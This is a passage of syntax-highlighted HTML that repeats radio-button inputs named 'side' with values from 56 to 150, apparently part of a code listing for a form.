class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;56&quot;</span> /&gt;</span>56<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;57&quot;</span> /&gt;</span>57<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;58&quot;</span> /&gt;</span>58<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;59&quot;</span> /&gt;</span>59<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;60&quot;</span> /&gt;</span>60<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;61&quot;</span> /&gt;</span>61<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;62&quot;</span> /&gt;</span>62<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;63&quot;</span> /&gt;</span>63<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;64&quot;</span> /&gt;</span>64<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;65&quot;</span> /&gt;</span>65<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;66&quot;</span> /&gt;</span>66<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;67&quot;</span> /&gt;</span>67<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;68&quot;</span> /&gt;</span>68<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;69&quot;</span> /&gt;</span>69<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;70&quot;</span> /&gt;</span>70<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;71&quot;</span> /&gt;</span>71<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;72&quot;</span> /&gt;</span>72<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;73&quot;</span> /&gt;</span>73<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;74&quot;</span> /&gt;</span>74<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;75&quot;</span> /&gt;</span>75<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;76&quot;</span> /&gt;</span>76<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;77&quot;</span> /&gt;</span>77<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;78&quot;</span> /&gt;</span>78<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;79&quot;</span> /&gt;</span>79<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;80&quot;</span> /&gt;</span>80<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;81&quot;</span> /&gt;</span>81<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;82&quot;</span> /&gt;</span>82<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;83&quot;</span> /&gt;</span>83<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;84&quot;</span> /&gt;</span>84<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;85&quot;</span> /&gt;</span>85<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;86&quot;</span> /&gt;</span>86<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;87&quot;</span> /&gt;</span>87<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;88&quot;</span> /&gt;</span>88<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;89&quot;</span> /&gt;</span>89<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;90&quot;</span> /&gt;</span>90<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;91&quot;</span> /&gt;</span>91<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;92&quot;</span> /&gt;</span>92<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;93&quot;</span> /&gt;</span>93<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;94&quot;</span> /&gt;</span>94<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;95&quot;</span> /&gt;</span>95<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;96&quot;</span> /&gt;</span>96<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;97&quot;</span> /&gt;</span>97<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;98&quot;</span> /&gt;</span>98<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;99&quot;</span> /&gt;</span>99<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;100&quot;</span> /&gt;</span>100<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;101&quot;</span> /&gt;</span>101<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;102&quot;</span> /&gt;</span>102<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;103&quot;</span> /&gt;</span>103<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;104&quot;</span> /&gt;</span>104<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;105&quot;</span> /&gt;</span>105<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;106&quot;</span> /&gt;</span>106<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;107&quot;</span> /&gt;</span>107<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;108&quot;</span> /&gt;</span>108<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;109&quot;</span> /&gt;</span>109<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;110&quot;</span> /&gt;</span>110<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;111&quot;</span> /&gt;</span>111<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;112&quot;</span> /&gt;</span>112<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;113&quot;</span> /&gt;</span>113<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;114&quot;</span> /&gt;</span>114<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;115&quot;</span> /&gt;</span>115<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;116&quot;</span> /&gt;</span>116<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;117&quot;</span> /&gt;</span>117<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;118&quot;</span> /&gt;</span>118<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;119&quot;</span> /&gt;</span>119<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;120&quot;</span> /&gt;</span>120<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;121&quot;</span> /&gt;</span>121<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;122&quot;</span> /&gt;</span>122<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;123&quot;</span> /&gt;</span>123<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;124&quot;</span> /&gt;</span>124<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;125&quot;</span> /&gt;</span>125<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;126&quot;</span> /&gt;</span>126<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;127&quot;</span> /&gt;</span>127<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;128&quot;</span> /&gt;</span>128<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;129&quot;</span> /&gt;</span>129<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;130&quot;</span> /&gt;</span>130<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;131&quot;</span> /&gt;</span>131<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;132&quot;</span> /&gt;</span>132<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;133&quot;</span> /&gt;</span>133<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;134&quot;</span> /&gt;</span>134<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;135&quot;</span> /&gt;</span>135<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;136&quot;</span> /&gt;</span>136<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;137&quot;</span> /&gt;</span>137<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;138&quot;</span> /&gt;</span>138<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;139&quot;</span> /&gt;</span>139<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;140&quot;</span> /&gt;</span>140<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;141&quot;</span> /&gt;</span>141<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;142&quot;</span> /&gt;</span>142<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;143&quot;</span> /&gt;</span>143<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;144&quot;</span> /&gt;</span>144<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;145&quot;</span> /&gt;</span>145<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;146&quot;</span> /&gt;</span>146<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;147&quot;</span> /&gt;</span>147<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;148&quot;</span> /&gt;</span>148<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;149&quot;</span> /&gt;</span>149<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;150&quot;</span> /&gt;</span>150<br>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;radio&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;side&quot;</span> <span 